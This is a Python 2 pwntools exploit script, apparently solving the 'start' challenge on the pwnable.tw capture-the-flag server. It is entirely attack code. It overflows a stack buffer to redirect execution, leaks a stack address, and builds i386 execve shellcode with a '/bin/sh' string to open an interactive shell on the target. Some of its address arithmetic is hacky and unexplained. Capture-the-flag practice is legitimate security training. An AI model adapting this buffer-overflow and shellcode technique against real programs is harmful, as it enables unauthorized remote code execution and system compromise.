from pwn import *
import time
padding_length = 20
shell_code = asm(
"""
    xor eax,eax
    mov eax,0x0b
    xor ecx,ecx
    xor edx,edx
    int 0x80
""",arch="i386")
if __name__ == '__main__':
    print 'len:',len(shell_code)
    HOST = 'ctf.pwnable.tw'
    PORT = 8731
    binary = 'start'
    mode = raw_input('mode:\n') 
    if mode == 'r\n':
        r = remote(HOST,PORT)
    else:
        r = process('./'+binary)
    raw_input('time to attach')
#jump to mov ecx,esp
    payload = cyclic(padding_length)+p32(0x08048087)
    r.send(payload)
    time.sleep(0.1)
#leak stack address 
    get = r.recv()
    print repr(get)
    ad = get[20:24]#-0x04000000+0x18000000
    sh = ''
    for x in range(1,5):
        sh+=ad[-1*x]
    print repr(ad),'--->',repr(sh)
    sh = int(sh.encode('hex'),16)-0x4+0x18
    sh = str(hex(sh))
    get =  p32(int(get[20:24].encode('hex'),16)-0x04000000,endian='big')
    print 'yoo->',repr(get),repr(sh)
    mov = asm('mov ebx,'+sh,arch="i386")
    print repr(mov)
    shell_code = mov +shell_code
    payload = shell_code+'\x90\x90'+get+'/bin/sh\x00'
    r.sendline(payload)
    
    r.interactive()
    r.close() 
